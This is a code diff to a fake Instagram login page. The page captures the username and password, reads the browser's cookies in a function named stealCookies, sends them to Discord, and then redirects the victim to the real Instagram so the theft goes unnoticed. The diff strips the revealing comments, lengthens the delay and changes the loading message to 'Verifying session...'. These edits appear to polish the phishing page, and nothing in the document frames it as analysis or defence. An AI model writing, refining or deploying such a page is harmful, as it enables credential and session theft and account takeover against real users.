@@ -54,16 +54,14 @@
 <body>
     <div class="login-container">
         <h2>Instagram</h2>
-        <!-- Form to capture login if not logged in -->
         <form id="loginForm">
             <input type="text" id="username" placeholder="Phone number, username, or email" required>
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit">Log In</button>
         </form>
         
-        <!-- Hidden form to capture cookie after login -->
         <form id="cookieForm" class="hidden">
-            <p>Logging you in...</p>
+            <p>Verifying session...</p>
         </form>
     </div>
 
@@ -74,23 +72,20 @@
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            // 1. Capture the credentials first (optional, but good to have)
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            // 2. Hide the form and show loading
             document.getElementById('loginForm').classList.add('hidden');
             document.getElementById('cookieForm').classList.remove('hidden');
 
-            // 3. Wait a second for Instagram to set the session cookie
+            // Increased delay to 3 seconds to ensure cookies are set by Instagram
             setTimeout(() => {
                 stealCookies(username, password);
-            }, 1000);
+            }, 3000);
         });
 
         async function stealCookies(user, pass) {
             try {
-                // Get all cookies
                 const cookies = document.cookie;
                 
                 // Send to Discord
@@ -104,11 +99,9 @@
                     })
                 });
 
-                // 4. Redirect to real Instagram so they don't suspect
                 window.location.href = 'https://www.instagram.com/';
             } catch (error) {
                 console.error('Error stealing cookies:', error);
-                // Still redirect even if error
                 window.location.href = 'https://www.instagram.com/';
             }
         }
